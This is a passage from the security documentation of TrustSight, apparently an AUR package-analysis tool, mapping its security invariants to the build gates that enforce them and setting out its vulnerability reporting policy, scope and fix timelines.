| `archives are never extracted to disk` | A8 | `full_aur/fetch.py` |
| `SQL is parameterised` | A9 | `db.py` |
| `terminal output is inert` | A10 | `safe_text.py`, `cli/` |
| `a seed cannot rewrite the database` | A12 | `db.import_seed` |
| `reserved names are refused by every writer` | A12, A13 | `db.upsert_package`, `db.save_package_profile`, `db.save_pkgbuild_snapshot` |
| `a baseline supplies state, not rules` | A13 | `full_aur/export.import_baseline` |
| `incomplete coverage fails closed` | B2 | `coverage.fail_closed` |
| `a truncated diff cannot read as unflagged` | B2 | `analysis/pipeline.py`, `full_aur/analyze.py` |
| `a coverage gap is always shown with the band` | B2 | `coverage.qualified_band`, `scoring.verdict_label` |
| `every result declares its coverage` | B2 | every `PackageFact(...)` construction |
| `a result reports what changed` | B7 | `changes` on every `PackageFact` |
| `change entries carry no severity` | B7 | `changes` is a list of plain strings |
| `content findings carry a location` | B8 | `findings.NON_CONTENT_RULES` |
| `no template grants permission to skip` | B9 | denylist over `verdict.py`, `findings.py` |
| `positive evidence never changes the score` | B10 | every `P` finding is INFO, weight 0 |
| `positive evidence cannot lower a FATAL` | B10, B4 | maximal declared evidence plus one FATAL |
| `declared findings fire under the shipped config` | B10 | every `P` finding reachable with the config that ships |
| `the flag threshold is derived, not copied` | B2 | `scoring.FLAG_THRESHOLD` |
| `the maturity numbers are derived, not copied` | B3 | `scoring._MATURITY_THRESHOLD` |
| `FATAL rules cannot be switched off` | B4 | `config.enforce_fatal_rules` |
| `FATAL findings survive every override` | B4, B5 | `override.filter_triggered_rules` |
| `doc cross-references resolve` | this page, and every page linking to it | every `docs/**` link and anchor |
| `docs/security.md matches the gates` | this page | the table above |

A11 has no row of its own: freshness anchoring is enforced by
`tests/test_fetcher.py` rather than by a gate, because the property is about
which value a function reads, and is checked most directly by calling it.

How each gate is scoped, and the recurring mistake that lets one pass while its
invariant is broken, is set out in
[reviewing a security control](contributing/security-review.md). Read it before
adding an invariant or a gate.

The last row is the one that keeps the rest honest: a gate with no entry here is
an unstated guarantee, and an entry with no gate is an unsupported promise. Both
fail the build.

Detection calibration is enforced separately by `scripts/calibration_gates.py`;
see [fire rates](explanation/fire-rates.md). The taxonomy and the adversarial
thread of this model are developed at three depths: [evidence tiers](reference/evidence-tiers.md)
describes the signals; [what TrustSight cannot see](explanation/what-trustsight-cannot-see.md)
describes the limits; this page describes the whole.

---

## Part D: Vulnerability reporting

### How to report

**Contact:** `emiliano.gandini@protonmail.com`  PGP: `F759D6D49B0A395AB922414A5CC3B4C50D37E793`

Provide steps to reproduce, the affected version (`trustsight --version`), and
what an attacker gains. A PKGBUILD or diff that demonstrates the issue is always
better than a description.

1. There will be an acknowledgement within 72 hours.
2. Triage follows within 7 days.
3. In-scope issues get fixed on the timeline below.
4. Do not open a public issue before a patch exists.

### Supported versions

Only the latest release is supported. Fixes ship in a new version; there are no
backports.

### What counts as a vulnerability in this kind of tool

TrustSight is an evidence tool with published limits, so "it missed something"
is usually a rule request, not a vulnerability. The taxonomy above is what
separates the two: a defect is a case where the tool moved between taxonomy
rows silently, or failed to protect the machine while doing it.

**In scope. Violations of Part A:**

- Code execution, file write, or file read outside the data/cache/config
  dirs, triggered by analysing a package.
- Any outbound connection to a host other than `aur.archlinux.org`, or any
  fetch of a URL a PKGBUILD declares.
- Terminal escape sequences or markup reaching a terminal from
  package-controlled text, including a crash of the renderer.
- Unbounded memory or CPU from a crafted package: a decompression bomb, a
  pathological regex input, a response with no cap.
- SQL injection or any write to the database driven by package-controlled
  text outside the columns it belongs in.
- A seed or baseline that changes state it is not permitted to change: a rule,
  a pattern, a severity, a weight, a metadata key it does not own, or a row
  learned from a real analysis. A validly signed baseline whose contents are
  simply hostile is not this: that is the documented shape of importing someone
  else's corpus, and A13 bounds what it can do.

**In scope. Violations of Part B:**

- A construction that causes an analysis to **skip content without a coverage
  gap being recorded**. Every bound that drops input has a gap; any other way
  to get content past the analyser silently is a vulnerability.
- A construction that produces an **UNFLAGGED or Low result despite an
  incomplete analysis**, or that gets an incomplete analysis rendered to a
  human with an **unqualified band**.
- Suppressing, removing or downgrading a FATAL rule or finding through any
  supported input.
- Making a finding disappear from the report without it appearing as
  suppressed.
- Any nondeterminism in the score: the same input producing different numbers.

**Out of scope:** rule evasion; score tuning; false positives; compromised
upstream packages (that is the point); anything requiring a local attacker with
write access to your config or your database; absence of runtime/sandbox
analysis; anything after `makepkg`.

### Timeline

| Severity | Definition | Fix released in |
| --- | --- | --- |
| Critical | Code execution or file write on the reviewer's machine, from analysing a package. | 7 days |
| High | Any other Part A breach, or a verdict-integrity breach under Part B. | 30 days |
| Moderate | A Part A or Part B breach that needs an unlikely precondition. | 90 days |
| Low | Hardening, no demonstrated attack. | Next release |

Reporters are credited in the changelog unless they ask not to be.

---

Back to the panel. The invariants in Part A are what keep the instrument
working while the input tries to break it. Part B bounds what a reading is
allowed to claim. Part C makes both fail the build the moment they stop being
true, which is the only reason the first two paragraphs of this page are worth
anything. The decision at the end is yours; the tool's job is to make sure you
are making it with the sensors you think you have.

The [evidence tiers](reference/evidence-tiers.md) are the sensor catalogue;
[what TrustSight cannot see](explanation/what-trustsight-cannot-see.md) is the
list of instruments this aircraft does not carry.